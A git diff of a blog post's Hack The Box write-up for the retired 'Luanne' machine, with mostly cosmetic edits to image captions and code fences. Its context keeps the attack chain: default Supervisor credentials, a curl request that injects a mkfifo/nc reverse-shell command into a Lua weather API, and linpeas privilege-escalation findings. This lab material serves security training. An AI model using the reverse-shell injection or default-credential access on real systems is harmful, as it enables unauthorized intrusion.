@@ -16,7 +16,7 @@ The box of this week will be **Luanne**, another easy-rated Linux box from  [Hac
 :information_source: **Info**: Write-ups for Hack The Box are always posted as soon as machines get retired.
 {: .notice--info}
 
-![laboratory-image](https://i.imgur.com/H8PyuHc.png){: .align-center}
+![HTB Luanne](https://i.imgur.com/H8PyuHc.png){: .align-center}
 
 ## Enumeration
 
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
 
 Acessing the root page of this webservice an authentication was requested, to which we still don't have any credentials to try. Something that called attention is a link to 3000/TCP on localhost, once we're acessing this website on 80/TCP, which shows us that this page is being published using some kind of proxy.
 
-![image-20210220064910702](https://i.imgur.com/29kTezx.png){: .align-center}
+![HTB Luanne - 3000/TCP](https://i.imgur.com/29kTezx.png){: .align-center}
 
 Acording to `nmap` scan, there's an entry on `robots.txt`. Validating its contents, we found some interesting information about a virtual directory called `/weather`.
 
@@ -112,13 +112,13 @@ Besides being possible to query all the information in this API, I couldn't to i
 
 Searching for `Medusa httpd 1.12 (Supervisor process manager)` I have found that this service could be an application called  [**Supervisor**](https://github.com/Supervisor/supervisor). Searching for its default credentials in the project page, I have found **user:123**, which allowed me to access the portal as below:
 
-![image-20210219140749159](https://i.imgur.com/2fSp0Lx.png){: .align-center}
+![HTB Luanne - Supervisor](https://i.imgur.com/2fSp0Lx.png){: .align-center}
 
 At first sight we can identify the running version, which is **4.2.0**, and that, unfortunately, has no known vulnerability/working PoC disclosed.
 
 Exploring all available options, an interesting point was noted: the link **processes**. Once you access it all the processes in execution will be listed, but one of them have stood over the others:
 
-```log
+```plaintext
 _httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
 ```
 
@@ -163,16 +163,14 @@ Session completed
 To get an reverse shell, I have executed the following HTTP request:
 
 ```bash
-
 curl -G --data-urlencode "city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f') x=('" http://10.10.10.218/weather/forecast
-
 ```
 
 ## User flag
 
 Inspecting the running processes from `linpeas.sh` execution, observed that user `r.michaels` has an copy of the lua script in execution on his profile. The idea was to get an reverse shell the same way we did at first, but the payload didn't worked. This and the path `devel` where this file reside indicate that this is a newer version patched for the existing vulnerability.
 
-```log
+```plaintext
 r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
 -b /home/r.michaels/devel/www
 ```
@@ -346,13 +344,14 @@ Executing `linpeas.sh` as this user I have found some interesting information th
 
 - User r.michaels has **doas** privileges. This is equivalent as the `sudo`group in the other distributions that permits running tasks as `root`;
 
-```log
+```plaintext
 [+] Checking doas.conf
 permit r.michaels as root
 ```
 
 - This user has a PGP key stored for `netpgp`, that will possibly allow is to decrypt the file found on backup folder;
-```log
+
+```plaintext
 [+] Do I have PGP keys?
 gpg Not Found
 /usr/bin/netpgpkeys
@@ -363,7 +362,8 @@ uid "RSA 2048-bit key <r.michaels@localhost>" ""
 ```
 
 - Some user writable directories:
-```log
+
+```plaintext
 [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
 /home/r.michaels
